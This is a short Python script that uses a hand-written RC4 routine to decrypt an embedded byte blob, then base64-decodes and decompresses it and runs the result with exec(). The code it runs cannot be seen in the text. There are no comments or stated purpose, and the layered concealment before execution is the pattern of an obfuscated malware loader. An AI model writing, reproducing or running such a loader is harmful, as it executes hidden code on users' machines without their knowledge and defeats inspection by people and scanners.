import base64, zlib
def _ksa(key):
    box = list(range(256))
    index = 0
    for position in range(256):
        index = (index + box[position] + key[position % len(key)]) & 0xFF
        box[position], box[index] = box[index], box[position]
    return box
def _rc4(data, key):
    box = _ksa(key)
    out = bytearray()
    first = second = 0
    for byte in data:
        first = (first + 1) & 0xFF
        second = (second + box[first]) & 0xFF
        box[first], box[second] = box[second], box[first]
        out.append(byte ^ box[(box[first] + box[second]) & 0xFF])
    return bytes(out)
_p = b"K3y!8z\x81\x8b'\x10\x99\xb7\x06\xd3\xb8\x7f\xe6\x12(\xe7\x85QZ\x98bD)\xc1|\xc44\xa4\xaf\x8ag\x06h>\x17\x8cu\xeb\x84n|\x85h\x1f\xcc2\xc3\xe3a\xb9\xc4\xe8\xd9g\xf5\x8cxb)\xd0\xb1\xdb\xda\xc4\xcbU=\x13\x80z\x9ag\xa7\xa8i\x1e\x08'g\x88ch\xae\x07\x97)\xd2\xde\xab4\x14CV.\xdeW.\xaf\x14\xf2%\xa5A\xbc\xddp(\xcb$\x1e*\xb3\xe9\x12\x84P\x14\x96\xda\xe6\x9exA\xd8\xeddY(_\\\xedQ\xd6\x16n\xf3\xd2\x91\x0b\xf0\xef7\x9e\x19\nW\xc9\xf5\xc1\xe4\x0e\x1f\x0b\xea\xca\xbf\xb6\xc1\x84\x15\x12\x0b"
exec(zlib.decompress(base64.b64decode(_rc4(_p[6:], _p[:6]))))
